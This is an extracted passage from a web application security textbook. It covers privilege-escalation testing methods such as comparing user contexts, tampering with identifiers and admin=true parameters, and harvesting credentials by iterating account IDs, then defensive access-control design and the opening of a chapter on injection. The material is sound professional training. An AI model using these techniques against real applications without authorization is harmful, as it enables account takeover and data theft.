Location-based access controls are relatively easy for an attacker to circumvent. Here are some common methods of bypassing them:
n Using a web proxy that is based in the required location
n Using a VPN that terminates in the required location
n Using a mobile device that supports data roaming
n Direct manipulation of client-side mechanisms for geolocation
Attacking Access Controls
Before starting to probe the application to detect any actual access control 
vulnerabilities, you should take a moment to review the results of your application mapping exercises (see Chapter 4). You need to understand what the 
application‚Äôs actual requirements are in terms of access control, and therefore 
where it will probably be most fruitful to focus your attention.
c08.indd 266 c08.indd 266 8/19/2011 12:08:31 PM 8/19/2011 12:08:31 PM
Stuttard c08.indd V3 - 07/28/2011 Page 267
 Chapter 8 n Attacking Access Controls 267
HACK STEPS
Here are some questions to consider when examining an application‚Äôs access 
controls:
 1. Do application functions give individual users access to a particular 
subset of data that belongs to them?
 2. Are there different levels of user, such as managers, supervisors, guests, 
and so on, who are granted access to different functions?
 3. Do administrators use functionality that is built into the same application 
to configure and monitor it?
 4. What functions or data resources within the application have you identified that would most likely enable you to escalate your current privileges?
 5. Are there any identifiers (by way of URL parameters of POST body message) that signal a parameter is being used to track access levels? 
Testing with Different User Accounts
The easiest and most effective way to test the effectiveness of an application‚Äôs 
access controls is to access the application using different accounts. That way 
you can determine whether resources and functionality that can be accessed 
legitimately by one account can be accessed illegitimately by another.
HACK STEPS
 1. If the application segregates user access to different levels of functionality, first use a powerful account to locate all the available functionality. 
Then attempt to access this using a lower-privileged account to test for 
vertical privilege escalation.
 2. If the application segregates user access to different resources (such as 
documents), use two different user-level accounts to test whether access 
controls are effective or whether horizontal privilege escalation is possible. For example, find a document that can be legitimately accessed by 
one user but not by another, and attempt to access it using the second 
user‚Äôs account ‚Äî either by requesting the relevant URL or by submitting 
the same POST parameters from within the second user‚Äôs session.
Testing an application‚Äôs access controls thoroughly is a time-consuming 
process. Fortunately, some tools can help you automate some of the work involved, 
to make your testing quicker and more reliable. This will allow you to focus 
on the parts of the task that require human intelligence to perform effectively.
c08.indd 267 c08.indd 267 8/19/2011 12:08:32 PM 8/19/2011 12:08:32 PM
Stuttard c08.indd V3 - 07/28/2011 Page 268
268 Chapter 8 n Attacking Access Controls
Burp Suite lets you map the contents of an application using two different 
user contexts. Then you can compare the results to see exactly where the content 
accessed by each user is the same or different.
HACK STEPS
 1. With Burp configured as your proxy and interception disabled, browse all 
the application‚Äôs content within one user context. If you are testing vertical access controls, use the higher-privilege account for this.
 2. Review the contents of Burp‚Äôs site map to ensure that you have identified 
all the functionality you want to test. Then use the context menu to select 
the ‚Äúcompare site maps‚Äù feature.
 3. To select the second site map to be compared, you can either load this 
from a Burp state file or have Burp dynamically rerequest the first site 
map in a new session context. To test horizontal access controls between 
users of the same type, you can simply load a state file you saved earlier, 
having mapped the application as a different user. For testing vertical 
access controls, it is preferable to rerequest the high-privilege site map as 
a low-privileged user, because this ensures complete coverage of the 
relevant functionality.
 4. To rerequest the first site map in a different session, you need to configure 
Burp‚Äôs session-handling functionality with the details of the low-privilege 
user session (for example, by recording a login macro or providing a 
specific cookie to be used in requests). This feature is described in more 
detail in Chapter 14. You may also need to define suitable scope rules to 
prevent Burp from requesting any logout function.
Figure 8-1 shows the results of a simple site map comparison. Its colorized 
analysis of the differences between the site maps shows items that have been 
added, removed, or modifi ed between the two maps. For modifi ed items, the 
table includes a ‚Äúdiff count‚Äù column, which is the number of edits required to 
modify the item in the fi rst map into the item in the second map. Also, when an 
item is selected, the responses are also colorized to show the locations of those 
edits within the responses.
Interpreting the results of the site map comparison requires human intelligence and an understanding of the meaning and context of specifi c application 
functions. For example, Figure 8-1 shows the responses that are returned to 
each user when they view their home page. The two responses show a different 
description of the logged-in user, and the administrative user has an additional 
menu item. These differences are to be expected, and they are neutral as to the 
effectiveness of the application‚Äôs access controls, since they concern only 
the user interface.
c08.indd 268 c08.indd 268 8/19/2011 12:08:32 PM 8/19/2011 12:08:32 PM
Stuttard c08.indd V3 - 07/28/2011 Page 269
 Chapter 8 n Attacking Access Controls 269
Figure 8-1: A site map comparison showing the differences between content that 
was accessed in different user contexts
Figure 8-2 shows the response returned when each user requests the top-level 
admin page. Here, the administrative user sees a menu of available options, while 
the ordinary user sees a ‚Äúnot authorized‚Äù message. These differences indicate 
that access controls are being applied correctly. Figure 8-3 shows the response 
returned when each user requests the ‚Äúlist users‚Äù admin function. Here, the 
responses are identical, indicating that the application is vulnerable, since the 
ordinary user should not have access to this function and does not have any 
link to it in his or her user interface.
Simply exploring the site map tree and looking at the number of differences 
between items is insuffi cient to evaluate the effectiveness of the application‚Äôs 
access controls. Two identical responses may indicate a vulnerability (for example, 
in an administrative function that discloses sensitive information) or may be 
harmless (for example, in an unprotected search function). Conversely, two different responses may still mean that a vulnerability exists (for example, in an 
administrative function that returns different content each time it is accessed) 
or may be harmless (for example, in a page showing profi le information about 
the currently logged-in user). For these reasons, fully automated tools generally are ineffective at identifying access control vulnerabilities. Using Burp‚Äôs 
functionality to compare site maps, you can automate as much of the process 
as possible, giving you all the information you need in a ready form, and letting you apply your knowledge of the application‚Äôs functionality to identify any 
actual vulnerabilities.
c08.indd 269 c08.indd 269 8/19/2011 12:08:32 PM 8/19/2011 12:08:32 PM
Stuttard c08.indd V3 - 07/28/2011 Page 270
270 Chapter 8 n Attacking Access Controls
Figure 8-2: The low-privileged user is denied access to the top-level admin page
Figure 8-3: The low-privileged user can access the administrative function to list 
application users
c08.indd 270 c08.indd 270 8/19/2011 12:08:32 PM 8/19/2011 12:08:32 PM
Stuttard c08.indd V3 - 07/28/2011 Page 271
 Chapter 8 n Attacking Access Controls 271
TRY IT!
http://mdsec.net/auth/462/
http://mdsec.net/auth/468/
Testing Multistage Processes
The approach described in the preceding section ‚Äî comparing the application‚Äôs contents when accessed in different user contexts ‚Äî is ineffective 
when testing some multistage processes. Here, to perform an action, the 
user typically must make several requests in the correct sequence, with the 
application building some state about the user‚Äôs actions as he or she does so. 
Simply rerequesting each of the items in a site map may fail to replicate the 
process correctly, so the attempted action may fail for reasons other than 
the use of access controls.
For example, consider an administrative function to add a new application 
user. This may involve several steps, including loading the form to add a user, 
submitting the form with details of the new user, reviewing these details, and 
confi rming the action. In some cases, the application may protect access to the 
initial form but fail to protect the page that handles the form submission or 
the confi rmation page. The overall process may involve numerous requests, 
including redirections, with parameters submitted at earlier stages being 
retransmitted later via the client side. Every step of this process needs to 
be tested individually, to confi rm whether access controls are being applied 
correctly.
TRY IT!
http://mdsec.net/auth/471/
HACK STEPS
 1. When an action is carried out in a multistep way, involving several different 
requests from client to server, test each request individually to determine 
whether access controls have been applied to it. Be sure to include every 
request, including form submissions, the following of redirections, and any 
unparameterized requests.
 2. Try to find any locations where the application effectively assumes that if 
you have reached a particular point, you must have arrived via legitimate 
means. Try to reach that point in other ways using a lower-privileged 
account to detect if any privilege escalation attacks are possible.
Continued
c08.indd 271 c08.indd 271 8/19/2011 12:08:33 PM 8/19/2011 12:08:33 PM
Stuttard c08.indd V3 - 07/28/2011 Page 272
272 Chapter 8 n Attacking Access Controls
 3. One way to perform this testing manually is to walk through a protected 
multistage process several times in your browser and use your proxy to 
switch the session token supplied in different requests to that of a 
less-privileged user.
 4. You can often dramatically speed up this process by using the ‚Äúrequest in 
browser‚Äù feature of Burp Suite:
 a. Use the higher-privileged account to walk through the entire multistage process.
 b. Log in to the application using the lower-privileged account (or none 
at all).
 c. In the Burp Proxy history, find the sequence of requests that were 
made when the multistage process was performed as a more privileged user. For each request in the sequence, select the context menu 
item ‚Äúrequest in browser in current browser session,‚Äù as shown in 
Figure 8-4. Paste the provided URL into your browser that is logged in 
as the lower-privileged user.
 d. If the application lets you, follow through the remainder of the 
multi-stage process in the normal way, using your browser.
 e. View the result within both the browser and the proxy history to 
determine whether it successfully performed the privileged action.
Figure 8-4: Using Burp to request a given item within the current browser session
HACK STEPS (CONTINUED)
c08.indd 272 c08.indd 272 8/19/2011 12:08:33 PM 8/19/2011 12:08:33 PM
Stuttard c08.indd V3 - 07/28/2011 Page 273
 Chapter 8 n Attacking Access Controls 273
When you select Burp‚Äôs ‚Äúrequest in browser in current browser session‚Äù 
feature for a specifi ed request, Burp gives you a unique URL targeting Burp‚Äôs 
internal web server, which you paste into your browser‚Äôs address bar. When 
your browser requests this URL, Burp returns a redirection to the originally 
specifi ed URL. When your browser follows the redirection, Burp replaces the 
request with the one you originally specifi ed, while leaving the Cookie header 
intact. If you are testing different user contexts, you can speed up this process. 
Log in to several different browsers as different users, and paste the URL into 
each browser to see how the request is handled for the user who is logged in 
using that browser. (Note that because cookies generally are shared between 
different windows of the same browser, you normally will need to use different browser products, or browsers on different machines, to perform this test.)
TIP When you are testing multistage processes in different user contexts, it 
is sometimes helpful to review the sequences of requests that are made by 
different users side-by-side to identify subtle differences that may merit 
further investigation.
If you are using separate browsers to access the application as different users, 
you can create a different proxy listener in Burp for use by each browser (you 
need to update your proxy confi guration in each browser to point to the relevant listener). Then, for each browser, use the context menu on the proxy 
history to open a new history window, and set a display fi lter to show only 
requests from the relevant proxy listener.
Testing with Limited Access
If you have only one user-level account with which to access the application (or 
none at all), additional work needs to be done to test the effectiveness of access 
controls. In fact, to perform a fully comprehensive test, further work needs to 
be done in any case. Poorly protected functionality may exist that is not explicitly linked from the interface of any application user. For example, perhaps old 
functionality has not yet been removed, or new functionality has been deployed 
but has not yet been published to users.
HACK STEPS
 1. Use the content discovery techniques described in Chapter 4 to identify 
as much of the application‚Äôs functionality as possible. Performing this 
exercise as a low-privileged user is often sufficient to both enumerate and 
gain direct access to sensitive functionality.
Continued
c08.indd 273 c08.indd 273 8/19/2011 12:08:33 PM 8/19/2011 12:08:33 PM
Stuttard c08.indd V3 - 07/28/2011 Page 274
274 Chapter 8 n Attacking Access Controls
 2. Where application pages are identified that are likely to present different functionality or links to ordinary and administrative users (for 
example, Control Panel or My Home Page), try adding parameters such 
as admin=true to the URL query string and the body of POST requests. 
This will help you determine whether this uncovers or gives access to any 
additional functionality than your user context has normal access to.
 3. Test whether the application uses the Referer header as the basis for 
making access control decisions. For key application functions that you 
are authorized to access, try removing or modifying the Referer header, 
and determine whether your request is still successful. If not, the application may be trusting the Referer header in an unsafe way. If you scan 
requests using Burp‚Äôs active scanner, Burp tries to remove the Referer
header from each request and informs you if this appears to make a systematic and relevant difference to the application‚Äôs response.
 4. Review all client-side HTML and scripts to find references to hidden 
functionality or functionality that can be manipulated on the client side, 
such as script-based user interfaces. Also, decompile all browser extension components as described in Chapter 5 to discover any references to 
server-side functionality.
TRY IT!
http://mdsec.net/auth/477/
http://mdsec.net/auth/472/
http://mdsec.net/auth/466/
When all accessible functionality has been enumerated, you need to test 
whether per-user segregation of access to resources is being correctly enforced. 
In every instance where the application grants users access to a subset of a wider 
range of resources of the same type (such as documents, orders, e-mails, and 
personal details), there may be opportunities for one user to gain unauthorized 
access to other resources.
HACK STEPS
 1. Where the application uses identifiers of any kind (document IDs, account 
numbers, order references) to specify which resource a user is requesting, 
attempt to discover the identifiers for resources to which you do not have 
authorized access.
HACK STEPS (CONTINUED)
c08.indd 274 c08.indd 274 8/19/2011 12:08:33 PM 8/19/2011 12:08:33 PM
Stuttard c08.indd V3 - 07/28/2011 Page 275
 Chapter 8 n Attacking Access Controls 275
 2. If it is possible to generate a series of such identifiers in quick succession (for example, by creating multiple new documents or orders), use the 
techniques described in Chapter 7 for session tokens to try to discover 
any predictable sequences in the identifiers the application produces.
 3. If it is not possible to generate any new identifiers, you are restricted to 
analyzing the identifiers you have already discovered, or even using plain 
guesswork. If the identifier has the form of a GUID, it is unlikely that any 
attempts based on guessing will be successful. However, if it is a relatively 
small number, try other numbers in close range, or random numbers with 
the same number of digits.
 4. If access controls are found to be broken, and resource identifiers are 
found to be predictable, you can mount an automated attack to harvest 
sensitive resources and information from the application. Use the techniques described in Chapter 14 to design a bespoke automated attack to 
retrieve the data you require.
A catastrophic vulnerability of this kind occurs where an Account Information 
page displays a user‚Äôs personal details together with his username and password. Although the password typically is masked on-screen, it is nevertheless 
transmitted in full to the browser. Here, you can often quickly iterate through 
the full range of account identifi ers to harvest the login credentials of all users, 
including administrators. Figure 8-5 shows Burp Intruder being used to carry 
out a successful attack of this kind.
Figure 8-5: A successful attack to harvest usernames and passwords via 
an access control vulnerability
c08.indd 275 c08.indd 275 8/19/2011 12:08:33 PM 8/19/2011 12:08:33 PM
Stuttard c08.indd V3 - 07/28/2011 Page 276
276 Chapter 8 n Attacking Access Controls
TRY IT!
http://mdsec.net/auth/488/
http://mdsec.net/auth/494/
TIP When you detect an access control vulnerability, an immediate attack to 
follow up with is to attempt to escalate your privileges further by compromising a user account that has administrative privileges. You can use various 
tricks to locate an administrative account. Using an access control fl aw like 
the one illustrated, you may harvest hundreds of user credentials and not 
relish the task of logging in manually as every user until you fi nd an administrator. However, when accounts are identifi ed by a sequential numeric 
ID, it is common to fi nd that the lowest account numbers are assigned to 
administrators. Logging in as the fi rst few users who were registered with 
the application often identifi es an administrator. If this approach fails, an 
effective method is to fi nd a function within the application where access is 
properly segregated horizontally, such as the main home page presented to 
each user. Write a script to log in using each set of captured credentials, and 
then try to access your own home page. It is likely that administrative users 
can view every user‚Äôs home page, so you will immediately detect when an 
administrative account is being used.
Testing Direct Access to Methods
Where an application uses requests that give direct access to server-side API 
methods, any access control weaknesses within those methods normally are 
identifi ed using the methodology already described. However, you should also 
test for the existence of additional APIs that may not be properly protected.
For example, a servlet may be invoked using the following request:
POST /svc HTTP/1.1
Accept-Encoding: gzip, deflate
Host: wahh-app
Content-Length: 37
servlet=com.ibm.ws.webcontainer.httpsession.IBMTrackerDebug
Since this is a well-known servlet, perhaps you can access other servlets to 
perform unauthorized actions.
c08.indd 276 c08.indd 276 8/19/2011 12:08:33 PM 8/19/2011 12:08:33 PM
Stuttard c08.indd V3 - 07/28/2011 Page 277
 Chapter 8 n Attacking Access Controls 277
HACK STEPS
 1. Identify any parameters that follow Java naming conventions (for example, get, set, add, update, is, or has followed by a capitalized word), or 
explicitly specify a package structure (for example, com.companyname
.xxx.yyy.ClassName). Make a note of all referenced methods you can 
find.
 2. Look out for a method that lists the available interfaces or methods. 
Check through your proxy history to see if it has been called as part of 
the application‚Äôs normal communication. If not, try to guess it using the 
observed naming convention.
 3. Consult public resources such as search engines and forum sites to determine any other methods that might be accessible.
 4. Use the techniques described in Chapter 4 to guess other method names.
 5. Attempt to access all methods gathered using a variety of user account 
types, including unauthenticated access.
 6. If you do not know the number or types of arguments expected by some 
methods, look for methods that are less likely to take arguments, such as 
listInterfaces and getAllUsersInRoles.
Testing Controls Over Static Resources
In cases where static resources that the application is protecting are ultimately 
accessed directly via URLs to the resource fi les themselves, you should test 
whether it is possible for unauthorized users to simply request these URLs directly.
HACK STEPS
 1. Step through the normal process for gaining access to a protected static 
resource to obtain an example of the URL by which it is ultimately 
retrieved.
 2. Using a different user context (for example, a less-privileged user or an 
account that has not made a required purchase), attempt to access the 
resource directly using the URL you have identified.
 3. If this attack succeeds, try to understand the naming scheme being used 
for protected static files. If possible, construct an automated attack to 
trawl for content that may be useful or that may contain sensitive data 
(see Chapter 14).
c08.indd 277 c08.indd 277 8/19/2011 12:08:34 PM 8/19/2011 12:08:34 PM
Stuttard c08.indd V3 - 07/28/2011 Page 278
278 Chapter 8 n Attacking Access Controls
Testing Restrictions on HTTP Methods
Although there may not be a ready means of detecting whether an application‚Äôs 
access controls make use of platform-level controls over HTTP methods, you 
can take some simple steps to identify any vulnerabilities.
HACK STEPS
 1. Using a high-privileged account, identify some privileged requests that 
perform sensitive actions, such as adding a new user or changing a user‚Äôs 
security role.
 2. If these requests are not protected by any anti-CSRF tokens or similar 
features (see Chapter 13), use the high-privileged account to determine 
whether the application still carries out the requested action if the HTTP 
method is modified. Test the following HTTP methods:
n POST
n GET
n HEAD
n An arbitrary invalid HTTP method
 3. If the application honors any requests using different HTTP methods than 
the original method, test the access controls over those requests using the 
standard methodology already described, using accounts with lower 
privileges.
Securing Access Controls
Access controls are one of the easiest areas of web application security to understand, although you must carefully apply a well-informed, thorough methodology 
when implementing them.
First, you should avoid several obvious pitfalls. These usually arise from 
ignorance about the essential requirements of effective access control or fl awed 
assumptions about the kinds of requests that users will make and against which 
the application needs to defend itself:
n Do not rely on users‚Äô ignorance of application URLs or the identifi ers used 
to specify application resources, such as account numbers and document 
IDs. Assume that users know every application URL and identifi er, and 
ensure that the application‚Äôs access controls alone are suffi cient to prevent 
unauthorized access.
c08.indd 278 c08.indd 278 8/19/2011 12:08:34 PM 8/19/2011 12:08:34 PM
Stuttard c08.indd V3 - 07/28/2011 Page 279
 Chapter 8 n Attacking Access Controls 279
n Do not trust any user-submitted parameters to signify access rights (such 
as admin=true).
n Do not assume that users will access application pages in the intended 
sequence. Do not assume that because users cannot access the Edit Users 
page, they cannot reach the Edit User X page that is linked from it.
n Do not trust the user not to tamper with any data that is transmitted via 
the client. If some user-submitted data has been validated and then is 
transmitted via the client, do not rely on the retransmitted value without 
revalidation.
The following represents a best-practice approach to implementing effective 
access controls within web applications:
n Explicitly evaluate and document the access control requirements for 
every unit of application functionality. This needs to include both who 
can legitimately use the function and what resources individual users 
may access via the function.
n Drive all access control decisions from the user‚Äôs session.
n Use a central application component to check access controls.
n Process every client request via this component to validate that the user 
making the request is permitted to access the functionality and resources 
being requested.
n Use programmatic techniques to ensure that there are no exceptions to the 
previous point. An effective approach is to mandate that every application 
page must implement an interface that is queried by the central access 
control mechanism. If you force developers to explicitly code access control 
logic into every page, there can be no excuse for omissions.
n For particularly sensitive functionality, such as administrative pages, you 
can further restrict access by IP address to ensure that only users from 
a specifi c network range can access the functionality, regardless of their 
login status.
n If static content needs to be protected, there are two methods of providing access control. First, static fi les can be accessed indirectly by passing 
a fi lename to a dynamic server-side page that implements relevant access 
control logic. Second, direct access to static fi les can be controlled using HTTP 
authentication or other features of the application server to wrap the incoming request and check the resource‚Äôs permissions before access is granted.
n Identifi ers specifying which resource a user wants to access are vulnerable to tampering whenever they are transmitted via the client. The server 
c08.indd 279 c08.indd 279 8/19/2011 12:08:34 PM 8/19/2011 12:08:34 PM
Stuttard c08.indd V3 - 07/28/2011 Page 280
280 Chapter 8 n Attacking Access Controls
should trust only the integrity of server-side data. Any time these identifi ers are transmitted via the client, they need to be revalidated to ensure 
that the user is authorized to access the requested resource.
n For security-critical application functions such as the creation of a new bill 
payee in a banking application, consider implementing per-transaction 
reauthentication and dual authorization to provide additional assurance 
that the function is not being used by an unauthorized party. This also 
mitigates the consequences of other possible attacks, such as session 
hijacking.
n Log every event where sensitive data is accessed or a sensitive action is 
performed. These logs will enable potential access control breaches to be 
detected and investigated.
Web application developers often implement access control functions on a 
piecemeal basis. They add code to individual pages in cases where some access 
control is required, and they often cut and paste the same code between pages 
to implement similar requirements. This approach carries an inherent risk of 
defects in the resulting access control mechanism. Many cases are overlooked 
where controls are required, controls designed for one area may not operate in 
the intended way in another area, and modifi cations made elsewhere within the 
application may break existing controls by violating assumptions made by them.
In contrast to this approach, the previously described method of using a 
central application component to enforce access controls has many benefi ts:
n It increases the clarity of access controls within the application, enabling 
different developers to quickly understand the controls implemented by 
others.
n It makes maintainability more effi cient and reliable. Most changes need 
to be applied only once, to a single shared component, and do not need 
to be cut and pasted to multiple locations.
n It improves adaptability. Where new access control requirements arise, 
they can be easily refl ected within an existing API implemented by each 
application page.
n It results in fewer mistakes and omissions than if access control code is 
implemented piecemeal throughout the application.
A Multilayered Privilege Model
Issues relating to access apply not only to the web application itself but also 
to the other infrastructure tiers that lie beneath it ‚Äî in particular, the application server, the database, and the operating system. Taking a defense-in-depth 
approach to security entails implementing access controls at each of these layers 
c08.indd 280 c08.indd 280 8/19/2011 12:08:34 PM 8/19/2011 12:08:34 PM
Stuttard c08.indd V3 - 07/28/2011 Page 281
 Chapter 8 n Attacking Access Controls 281
to create several layers of protection. This provides greater assurance against 
threats of unauthorized access, because if an attacker succeeds at compromising 
defenses at one layer, the attack may yet be blocked by defenses at another layer.
In addition to implementing effective access controls within the web application itself, as already described, a multilayered approach can be applied in 
various ways to the components that underlie the application:
n The application server can be used to control access to entire URL paths 
on the basis of user roles that are defi ned at the application server tier.
n The application can employ a different database account when carrying out the actions of different users. For users who should only be 
querying data (not updating it), an account with read-only privileges 
should be used.
n Fine-grained control over access to different database tables can be implemented within the database itself, using a table of privileges.
n The operating system accounts used to run each component in the infrastructure can be restricted to the least powerful privileges that the component actually requires.
In a complex, security-critical application, layered defenses of this kind can 
be devised with the help of a matrix defi ning the different user roles within 
the application and the different privileges, at each tier, that should be assigned 
to each role. Figure 8-6 is a partial example of a privilege matrix for a complex 
application.
Figure 8-6: A privilege matrix for a complex application
Application Server Application Roles Database Privileges
c08.indd 281 c08.indd 281 8/19/2011 12:08:34 PM 8/19/2011 12:08:34 PM
Stuttard c08.indd V3 - 07/28/2011 Page 282
282 Chapter 8 n Attacking Access Controls
Within a security model of this kind, you can see how various useful access 
control concepts can be applied:
n Programmatic control ‚Äî The matrix of individual database privileges is 
stored in a table within the database and is applied programmatically to 
enforce access control decisions. The classifi cation of user roles provides a 
shortcut for applying certain access control checks, and this is also applied 
programmatically. Programmatic controls can be extremely fi ne-grained 
and can build arbitrarily complex logic into the process of carrying out 
access control decisions within the application.
n Discretionary access control (DAC) ‚Äî Administrators can delegate their 
privileges to other users in relation to specifi c resources they own, employing discretionary access control. This is a closed DAC model, in which access 
is denied unless explicitly granted. Administrators also can lock or expire 
individual user accounts. This is an open DAC model, in which access is 
permitted unless explicitly withdrawn. Various application users have privileges to create user accounts, again applying discretionary access control.
n Role-based access control (RBAC) ‚Äî Named roles contain different sets 
of specifi c privileges, and each user is assigned to one of these roles. This 
serves as a shortcut for assigning and enforcing different privileges and 
is necessary to help manage access control in complex applications. Using 
roles to perform up-front access checks on user requests enables many 
unauthorized requests to be quickly rejected with a minimum amount of 
processing being performed. An example of this approach is protecting 
the URL paths that specifi c types of users may access.
When designing role-based access control mechanisms, you must balance 
the number of roles so that they remain a useful tool to help manage privileges within the application. If too many fi ne-grained roles are created, the 
number of different roles becomes unwieldy, and they are diffi cult to manage 
accurately. If too few roles are created, the resulting roles will be a coarse 
instrument for managing access. It is likely that individual users will be 
assigned privileges that are not strictly necessary to perform their function.
If platform-level controls are used to restrict access to different application 
roles based on HTTP method and URL, these should be designed using 
a default-deny model, as is best practice for fi rewall rules. This should 
include various specifi c rules that assign certain HTTP methods and URLs 
to certain roles, and the fi nal rule should deny any request that does not 
match a previous rule.
n Declarative control ‚Äî The application uses restricted database accounts 
when accessing the database. It employs different accounts for different 
groups of users, with each account having the least level of privilege 
c08.indd 282 c08.indd 282 8/19/2011 12:08:34 PM 8/19/2011 12:08:34 PM
Stuttard c08.indd V3 - 07/28/2011 Page 283
 Chapter 8 n Attacking Access Controls 283
necessary to carry out the actions that group is permitted to perform. 
Declarative controls of this kind are declared from outside the application. This is a useful application of defense-in-depth principles, because 
privileges are imposed on the application by a different component. Even 
if a user fi nds a way to breach the access controls implemented within the 
application tier in order to perform a sensitive action, such as adding a 
new user, he is prevented from doing so. The database account that he is 
using does not have the required privileges within the database.
A different means of applying declarative access control exists at the 
application server level, via deployment descriptor fi les, which are applied 
during application deployment. However, these can be relatively blunt 
instruments and do not always scale well to manage fi ne-grained privileges in a large application.
HACK STEPS
If you are attacking an application that employs a multilayered privilege 
model of this kind, it is likely that many of the most obvious mistakes that 
are commonly made in applying access controls will be defended against. You 
may fi nd that circumventing the controls implemented within the application 
does not get you very far, because of protection in place at other layers. With 
this in mind, several potential lines of attack are still available to you. Most 
importantly, understanding the limitations of each type of control, in terms of 
the protection it does not offer, will help you identify the vulnerabilities that 
are most likely to affect it:
n Programmatic checks within the application layer may be susceptible to 
injection-based attacks.
n Roles defi ned at the application server layer are often coarsely defi ned 
and may be incomplete.
n Where application components run using low-privileged operating system accounts, typically they can read many kinds of potentially sensitive 
data within the host fi le system. Any vulnerabilities granting arbitrary fi le 
access may still be usefully exploited, even if only to read sensitive data.
n Vulnerabilities within the application server software itself typically 
enable you to defeat all access controls implemented within the application layer, but you may still have limited access to the database and 
operating system.
n A single exploitable access control vulnerability in the right location may 
still provide a starting point for serious privilege escalation. For example, 
if you discover a way to modify the role associated with your account, 
you may fi nd that logging in again with that account gives you enhanced 
access at both the application and database layers.
c08.indd 283 c08.indd 283 8/19/2011 12:08:34 PM 8/19/2011 12:08:34 PM
Stuttard c08.indd V3 - 07/28/2011 Page 284
284 Chapter 8 n Attacking Access Controls
Summary
Access control defects can manifest themselves in various ways. In some cases, 
they may be uninteresting, allowing illegitimate access to a harmless function 
that cannot be leveraged to escalate privileges any further. In other cases, fi nding a weakness in access controls can quickly lead to a complete compromise 
of the application.
Flaws in access control can arise from various sources. A poor application 
design may make it diffi cult or impossible to check for unauthorized access, a 
simple oversight may leave only one or two functions unprotected, or defective 
assumptions about how users will behave can leave the application undefended 
when those assumptions are violated.
In many cases, fi nding a break in access controls is almost trivial. You simply 
request a common administrative URL and gain direct access to the functionality. In other cases, it may be very hard, and subtle defects may lurk deep within 
application logic, particularly in complex, high-security applications. The most 
important lesson when attacking access controls is to look everywhere. If you 
are struggling to make progress, be patient, and test every step of every application function. A bug that allows you to own the entire application may be just 
around the corner.
Questions
Answers can be found at http://mdsec.net/wahh.
 1. An application may use the HTTP Referer header to control access without 
any overt indication of this in its normal behavior. How can you test for 
this weakness?
 2. You log in to an application and are redirected to the following URL:
https://wahh-app.com/MyAccount.php?uid=1241126841
The application appears to be passing a user identifi er to the MyAccount.php
page. The only identifi er you are aware of is your own. How can you test 
whether the application is using this parameter to enforce access controls 
in an unsafe way?
 3. A web application on the Internet enforces access controls by examining 
users‚Äô source IP addresses. Why is this behavior potentially fl awed?
c08.indd 284 c08.indd 284 8/19/2011 12:08:34 PM 8/19/2011 12:08:34 PM
Stuttard c08.indd V3 - 07/28/2011 Page 285
 Chapter 8 n Attacking Access Controls 285
 4. An application‚Äôs sole purpose is to provide a searchable repository of 
information for use by members of the public. There are no authentication or session-handling mechanisms. What access controls should be 
implemented within the application?
 5. When browsing an application, you encounter several sensitive resources 
that need to be protected from unauthorized access and that have the .xls
fi le extension. Why should these immediately catch your attention?
c08.indd 285 c08.indd 285 8/19/2011 12:08:35 PM 8/19/2011 12:08:35 PM
Stuttard c08.indd V1 - 07/04/2011 Page 286
c08.indd 286 c08.indd 286 8/19/2011 12:08:35 PM 8/19/2011 12:08:35 PM
Stuttard c09.indd V3 - 07/28/2011 Page 287
287
 C H A P T E R 
9
Attacking Data Stores
Nearly all applications rely on a data store to manage data that is processed 
within the application. In many cases this data drives the core application logic, 
holding user accounts, permissions, application confi guration settings, and more. 
Data stores have evolved to become signifi cantly more than passive containers 
for data. Most hold data in a structured format, accessed using a predefi ned 
query format or language, and contain internal logic to help manage that data.
Typically, applications use a common privilege level for all types of access 
to the data store and when processing data belonging to different application 
users. If an attacker can interfere with the application‚Äôs interaction with the data 
store, to make it retrieve or modify different data, he can usually bypass any 
controls over data access that are imposed at the application layer.
The principle just described can be applied to any kind of data store technology. Because this is a practical handbook, we will focus on the knowledge 
and techniques you need to exploit the vulnerabilities that exist in real-world 
applications. By far the most common data stores are SQL databases, XMLbased repositories, and LDAP directories. Practical examples seen elsewhere 
are also covered.
In covering these key examples, we will describe the practical steps that you 
can take to identify and exploit these defects. There is a conceptual synergy in 
the process of understanding each new type of injection. Having grasped the 
essentials of exploiting these manifestations of the fl aw, you should be confi dent 
that you can draw on this understanding when you encounter a new category 
c09.indd 287 c09.indd 287 8/19/2011 12:09:28 PM 8/19/2011 12:09:28 PM
Stuttard c09.indd V3 - 07/28/2011 Page 288
288 Chapter 9 n Attacking Data Stores
of injection. Indeed, you should be able to devise additional means of attacking 
those that others have already studied.
Injecting into Interpreted Contexts
An interpreted language is one whose execution involves a runtime component 
that interprets the language‚Äôs code and carries out the instructions it contains. 
In contrast, a compiled language is one whose code is converted into machine 
instructions at the time of generation. At runtime, these instructions are executed 
directly by the processor of the computer that is running it.
In principle, any language can be implemented using either an interpreter or 
a compiler, and the distinction is not an inherent property of the language itself. 
Nevertheless, most languages normally are implemented in only one of these 
two ways, and many of the core languages used to develop web applications 
are implemented using an interpreter, including SQL, LDAP, Perl, and PHP.
Because of how interpreted languages are executed, a family of vulnerabilities 
known as code injection arises. In any useful application, user-supplied data is 
received, manipulated, and acted on. Therefore, the code that the interpreter 
processes is a mix of the instructions written by the programmer and the data 
supplied by the user. In some situations, an attacker can supply crafted input 
that breaks out of the data context, usually by supplying some syntax that has 
a special signifi cance within the grammar of the interpreted language being 
used. The result is that part of this input gets interpreted as program instructions, which are executed in the same way as if they had been written by the 
original programmer. Often, therefore, a successful attack fully compromises 
the component of the application that is being targeted.
In native compiled languages, on the other hand, attacks designed to execute 
arbitrary commands are usually very different. The method of injecting code 
normally does not leverage any syntactic feature of the language used to develop 
the target program, and the injected payload usually contains machine code 
rather than instructions written in that language. See Chapter 16 for details of 
common attacks against native compiled software.
Bypassing a Login
The process by which an application accesses a data store usually is the same, 
regardless of whether that access was triggered by the actions of an unprivileged user or an application administrator. The web application functions as a 
discretionary access control to the data store, constructing queries to retrieve, 
add, or modify data in the data store based on the user‚Äôs account and type. 
A successful injection attack that modifi es a query (and not merely the data 
c09.indd 288 c09.indd 288 8/19/2011 12:09:29 PM 8/19/2011 12:09:29 PM
Stuttard c09.indd V3 - 07/28/2011 Page 289
 Chapter 9 n Attacking Data Stores 289
within the query) can bypass the application‚Äôs discretionary access controls 
and gain unauthorized access.
If security-sensitive application logic is controlled by the results of a query, an 
attacker can potentially modify the query to alter the application‚Äôs logic. Let‚Äôs 
look at a typical example where a back-end data store is queried for records in 
a user table that match the credentials that a user supplied. Many applications 
that implement a forms-based login function use a database to store user credentials and perform a simple SQL query to validate each login attempt. Here 
is a typical example:
